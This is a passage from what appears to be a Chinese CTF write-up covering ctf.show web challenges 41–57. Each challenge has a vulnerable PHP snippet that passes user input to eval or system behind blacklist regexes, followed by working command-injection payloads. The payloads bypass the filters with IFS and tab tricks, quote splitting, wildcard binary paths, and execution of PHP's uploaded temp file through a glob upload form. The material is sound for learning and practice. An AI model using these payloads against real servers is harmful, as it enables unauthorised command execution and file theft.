class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c'</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">"echo(<span class="hljs-subst">$c</span>);"</span>);<br>    }<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>突破点在异或没有被过滤，可以找到符号条件的字符异或得到</p><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">if</span>(isset($_GET[<span class="hljs-string">'c'</span>]))<br>{<br>$c=$_GET[<span class="hljs-string">'c'</span>];<br><span class="hljs-keyword">system</span>($c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>); <br>}<br></code></pre></td></tr></tbody></table></figure><p><code>system($c." &gt;/dev/null 2&gt;&amp;1");</code> 这行代码使用 <code>system()</code> 函数执行外部命令。它将变量 <code>$c</code> 的值与字符串 <code>" &gt;/dev/null 2&gt;&amp;1"</code> 连接，并作为参数传递给 <code>system()</code> 函数。</p><ul><li><code>&gt;/dev/null</code> 是 Linux 中的重定向操作符，将命令的标准输出重定向到 <code>/dev/null</code> 设备文件，这意味着命令的输出将被丢弃。</li><li><code>2&gt;&amp;1</code> 是将命令的标准错误输出重定向到标准输出的操作符。这样，命令的错误输出也将被重定向到 <code>/dev/null</code>，即被丢弃。</li></ul><p>目的是以安静模式运行命令，不显示任何输出，并且将任何错误输出也丢弃</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">;<span class="hljs-regexp">//</span>分号               t<br>|<span class="hljs-regexp">//</span>只执行后面那条命令  f<br>||<span class="hljs-regexp">//</span>只执行前面那条命令  t<br>&amp;<span class="hljs-regexp">//</span>两条命令都会执行    f<br>&amp;&amp;<span class="hljs-regexp">//</span>两条命令都会执行    f<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php;<br></code></pre></td></tr></tbody></table></figure><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>添加了过滤</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></tbody></table></figure><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/;|cat|flag/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>添加了过滤flag</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac f*||<br></code></pre></td></tr></tbody></table></figure><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| /i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>过滤增加了空格</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac$IFS$9f*||<br>?<span class="hljs-attribute">c</span>=tac%09fla*||<br></code></pre></td></tr></tbody></table></figure><h3 id="web46-49"><a href="#web46-49" class="headerlink" title="web46-49"></a>web46-49</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-number">46</span>：<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br><span class="hljs-number">47</span>：<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br><span class="hljs-number">48</span>：<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>类上，增加了过滤数字和美元符以及通配符*</p><figure class="highlight llvm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></tbody></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>%09不是数字</p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><p>51增加了过滤tac</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fla<span class="hljs-string">''</span>g.php||  <span class="hljs-comment">#查看源码</span><br>?c=<span class="hljs-built_in">tac</span>&lt;fla<span class="hljs-string">''</span>g.php||<br>?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">''</span>ag.php%0a    <span class="hljs-comment">#%0a在URL中是换行符</span><br>两个单引号分割字符串，中间会自动忽略<br><span class="hljs-built_in">nl</span>-&gt;带行号读取,不支持通配符<br></code></pre></td></tr></tbody></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">" &gt;/dev/null 2&gt;&amp;1"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:<br>?c=<span class="hljs-built_in">cp</span><span class="hljs-variable">${IFS}</span>/fla?<span class="hljs-variable">${IFS}</span>a.txt||<span class="hljs-built_in">ls</span>  复制到a.txt<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">${IFS}</span>a.txt||<span class="hljs-built_in">ls</span>        直接访问a.txt也行<br>payload2:<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">${IFS}</span>/fla<span class="hljs-string">''</span>g||<span class="hljs-built_in">ls</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br&gt;"</span>.<span class="hljs-variable">$d</span>;<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no'</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以先传递ls，可以发现flag应该在flag.php中</p><p>PY:</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=c<span class="hljs-string">''</span>at<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.p<span class="hljs-string">''</span>hp<br><span class="hljs-string">?c</span>=nl<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.php<br><span class="hljs-string">?c</span>=cp<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}fla<span class="hljs-string">''</span>g.php<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}a.txt   <span class="hljs-comment">#访问a.txt</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">if(isset($<span class="hljs-emphasis">_GET['c'])){</span><br><span class="hljs-emphasis">    $c=$_GET['c'];</span><br><span class="hljs-emphasis">    if(!preg_</span>match("/\;|.<span class="hljs-strong">*c.*a.*t.*</span>|.<span class="hljs-strong">*f.*l.*a.*g.*</span>| |[0-9]|\*|.<span class="hljs-strong">*m.*o.*r.*e.*</span>|.<span class="hljs-strong">*w.*g.*e.*t.*</span>|.<span class="hljs-strong">*l.*e.*s.*s.*</span>|.<span class="hljs-strong">*h.*e.*a.*d.*</span>|.<span class="hljs-strong">*s.*o.*r.*t.*</span>|.<span class="hljs-strong">*t.*a.*i.*l.*</span>|.<span class="hljs-strong">*s.*e.*d.*</span>|.<span class="hljs-strong">*c.*u.*t.*</span>|.<span class="hljs-strong">*t.*a.*c.*</span>|.<span class="hljs-strong">*a.*w.*k.*</span>|.<span class="hljs-strong">*s.*t.*r.*i.*n.*g.*s.*</span>|.<span class="hljs-strong">*o.*d.*</span>|.<span class="hljs-strong">*c.*u.*r.*l.*</span>|.<span class="hljs-strong">*n.*l.*</span>|.<span class="hljs-strong">*s.*c.*p.*</span>|.<span class="hljs-strong">*r.*m.*</span>|\`|\%|\x09|\x26|\&gt;|\&lt;/i", $c)){<br><span class="hljs-code">        system($c);</span><br><span class="hljs-code">    }</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>PY1:</p><p>过滤方式是通配符连接的cat,flag等等，我们可以使用mv命令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">${IFS}</span>fla?.php<span class="hljs-variable">${IFS}</span>a.txt<br>重命名后访问即可<br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/</span><span class="hljs-string">?a</span>t<span class="hljs-variable">${</span><span class="hljs-variable constant_">IFS</span>}f?<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></tbody></table></figure><p>/bin目录下的cat命令执行查看文件</p><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>(1)/bin目录</p><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>这里我们可以利用 base64 中的64 进行通配符匹配 即 /bin/base64 flag.php</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></tbody></table></figure><p>(2) /ussr/bin目录</p><p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、newaliases、nslookup passwd、quota、smb</em>、wget等。<br>可以利用/usr/bin下的bzip2 意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-regexp">/flag.php.bz2</span><br></code></pre></td></tr></tbody></table></figure><p>(3)POST包</p><p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。[@-[]可以用来通配表示大写字母，过滤掉干扰文件，最后一位一般为大写，而在linux系统下.是可以用来执行任意脚本文件的，利用这两点，我们可以构造payload</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=.%<span class="hljs-number">20</span>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">?[</span>@-[]<br></code></pre></td></tr></tbody></table></figure><p>文件内容以 #!/bin/sh 开头</p><p>下带我们要执行的命令</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://cfe00e5c-379f-4958-a666-7b5ce9bcc58f.challenge.ctf.show/"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">"multipart/form-data"</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--目标网址--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">"file"</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"file"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"file"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>方法1、2都是在字母被过滤而数字未被过滤的情况下，利用特定目录下的命令带数字(base64、bzip2)来定位我们要执行的命令，再利用通配符来达到CTF。</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>可以看到，再55题基础上，增加了过滤数字及一些符号，</p><p>参见无数字数字Getshell:<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">文章</a></p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">用. <span class="hljs-keyword">file</span>执行文件，是不需要<span class="hljs-keyword">file</span>有x权限的。<br>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<span class="hljs-regexp">/tmp/</span>phpXXXXXX，文件名最后<span class="hljs-number">6</span>个字符是随机的大小写字母<br><br>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。<br><br>翻开ascii码表，可见大写字母位于@与[之间,那么，我们可以利用[@-[]来表示大写字母.<br></code></pre></td></tr></tbody></table></figure><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>注意：flag in 36.php </p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-symbol">$</span>c=<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span>, <span class="hljs-symbol">$</span>c)){<br>        <span class="hljs-keyword">system</span>(<span class="hljs-string">"cat "</span>.<span class="hljs-symbol">$</span>c.<span class="hljs-string">".php"</span>);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo $(()) <span class="hljs-comment">//运算符</span><br><span class="hljs-number">0</span><br>echo ~$(())<br>~<span class="hljs-number">0</span><br>echo $((~$(())))<br><span class="hljs-number">-1</span><br>echo 